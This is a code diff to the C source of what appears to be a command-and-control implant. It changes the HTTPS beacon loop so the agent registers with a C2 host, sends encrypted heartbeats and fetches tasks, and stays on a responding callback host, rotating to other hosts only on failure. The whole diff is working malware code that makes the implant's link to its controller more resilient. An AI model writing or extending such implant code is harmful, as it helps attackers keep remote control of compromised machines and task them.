@@ -163,6 +163,9 @@ static pthread_mutex_t g_https_mutex = PTHREAD_MUTEX_INITIALIZER;
 static uint8_t  g_host_idx  = 0;
 static char     g_cur_host[256] = {0};
 static uint16_t g_cur_port  = 0;
+/* Sticky host: once a callback responds successfully, stay on it.
+ * Only rotate to the next one when the current host fails. */
+static int      g_host_ok   = 0;
 
 #ifdef NAX_CB_HOST_COUNT
 static void nax_get_compiled_host(uint8_t idx, char *host, uint16_t *port)
@@ -191,27 +194,20 @@ static void nax_get_compiled_host(uint8_t idx, char *host, uint16_t *port)
 }
 #endif /* NAX_CB_HOST_COUNT */
 
-static void https_rotate_host(NaxAgent *a)
+/* https_select_host — load the current host into g_cur_host/g_cur_port
+ * without advancing the index. Called once at startup and after a
+ * successful rotation to prime the current host. */
+static void https_select_host(NaxAgent *a)
 {
     uint8_t count = nax_profile_callbacks_count();
     if (count > 0) {
-        uint8_t rotation = nax_profile_rotation();
-        if (rotation == 1) {
-            FILE *f = fopen("/dev/urandom", "rb");
-            uint8_t r = 0;
-            if (f) { fread(&r, 1, 1, f); fclose(f); }
-            g_host_idx = r % count;
-        }
         char host[256] = {0}; uint16_t port = 0;
         if (nax_profile_callback_host(g_host_idx, host, &port) == 0) {
             strncpy(g_cur_host, host, sizeof(g_cur_host) - 1);
             g_cur_port = port;
         }
-        if (rotation != 1)
-            g_host_idx = (g_host_idx + 1) % count;
         return;
     }
-
 #ifdef NAX_CB_HOST_COUNT
     uint8_t cb_count = NAX_CB_HOST_COUNT;
     if (cb_count > 0) {
@@ -221,7 +217,45 @@ static void https_rotate_host(NaxAgent *a)
             strncpy(g_cur_host, host, sizeof(g_cur_host) - 1);
             g_cur_port = port;
         }
+        return;
+    }
+#endif
+    strncpy(g_cur_host, a->cfg.c2_host, sizeof(g_cur_host) - 1);
+    g_cur_port = (uint16_t)a->cfg.c2_port;
+}
+
+/* https_rotate_host — advance to the next host (called only on failure).
+ * For random rotation the index is randomized; for sequential it advances.
+ * After updating the index, primes g_cur_host via https_select_host. */
+static void https_rotate_host(NaxAgent *a)
+{
+    uint8_t count = nax_profile_callbacks_count();
+    if (count > 0) {
+        uint8_t rotation = nax_profile_rotation();
+        if (rotation == 1) {
+            /* random — pick a new random index */
+            FILE *f = fopen("/dev/urandom", "rb");
+            uint8_t r = 0;
+            if (f) { fread(&r, 1, 1, f); fclose(f); }
+            g_host_idx = r % count;
+        } else {
+            /* sequential — advance to next */
+            g_host_idx = (g_host_idx + 1) % count;
+        }
+        g_host_ok = 0;
+        https_select_host(a);
+        DBG("rotated to host [%u] %s:%u", g_host_idx,
+            g_cur_host[0] ? g_cur_host : "?", g_cur_port);
+        return;
+    }
+#ifdef NAX_CB_HOST_COUNT
+    uint8_t cb_count = NAX_CB_HOST_COUNT;
+    if (cb_count > 0) {
         g_host_idx = (g_host_idx + 1) % cb_count;
+        g_host_ok  = 0;
+        https_select_host(a);
+        DBG("rotated to compiled host [%u] %s:%u", g_host_idx,
+            g_cur_host[0] ? g_cur_host : "?", g_cur_port);
         return;
     }
 #endif
@@ -830,12 +864,22 @@ void nax_https_main(NaxAgent *a)
     NaxSysInfo info;
     nax_gather_sysinfo(&info);
 
-    while (a->running) {
-        /* ── Registration loop ── */
-        https_rotate_host(a);
-        int registered = 0;
+    /* Prime the first host without rotating */
+    https_select_host(a);
+    g_host_ok = 1; /* treat first host as "selected" so we don't rotate before trying it */
 
+    while (a->running) {
+        /* ── Registration loop ──
+         * Try every host until one accepts the REGISTER.
+         * Rotate to the next host after each failure. */
+
+        /* ── REGISTER ── */
+        int registered = 0;
         while (a->running && !registered) {
+            /* Rotate on failure (g_host_ok==0); first entry skips rotate */
+            if (!g_host_ok)
+                https_rotate_host(a);
+
             uint8_t reg_body[4096]; uint32_t reg_body_len = sizeof(reg_body);
             if (nax_build_reg_body(
                     info.hostname, strlen(info.hostname),
@@ -872,8 +916,8 @@ void nax_https_main(NaxAgent *a)
                 DBG_ERR("REGISTER failed — no response");
                 if (resp) free(resp);
                 sleep(3);
-                https_rotate_host(a);
-                continue;
+                g_host_ok = 0; /* rotate to next host on next iteration */
+                continue;      /* retry REGISTER loop with next host */
             }
             DBG("REGISTER response: %u bytes", resp_len);
 
@@ -897,6 +941,7 @@ void nax_https_main(NaxAgent *a)
                 extern void nax_dbg_print_profile_pub(void);
                 nax_dbg_print_profile_pub();
                 registered = 1;
+                g_host_ok  = 1; /* host responded — stay on it */
                 DBG_OK("REGISTERED — entering heartbeat loop");
             } else {
                 DBG_ERR("REGISTER: unexpected frame type=0x%02x", ft);
@@ -904,10 +949,14 @@ void nax_https_main(NaxAgent *a)
             free(plain);
         }
         if (!a->running) break;
+        if (!registered) continue; /* REGISTER failed — restart outer loop */
 
-        /* ── Heartbeat loop ── */
+        /* ── Heartbeat loop ── (only reached after successful REGISTER) */
         while (a->running) {
-            https_rotate_host(a);
+            /* Only rotate when the current host failed last cycle.
+             * If it succeeded (g_host_ok), stay on it. */
+            if (!g_host_ok)
+                https_rotate_host(a);
 
             /* GET — encrypted heartbeat */
             uint8_t hb_frame[256]; uint32_t hb_frame_len = sizeof(hb_frame);
@@ -932,11 +981,14 @@ void nax_https_main(NaxAgent *a)
             if (!resp) {
                 if (resp_len == 0) {
                     DBG("GET: EmptyResp — no tasks");
+                    g_host_ok = 1; /* server responded (empty = no tasks) */
                 } else {
                     DBG_ERR("GET failed (resp_len=%u)", resp_len);
+                    g_host_ok = 0; /* will rotate next cycle */
                 }
             } else {
                 DBG_OK("GET: %u bytes — processing", resp_len);
+                g_host_ok = 1;
             }
 
             int had_tasks = 0;
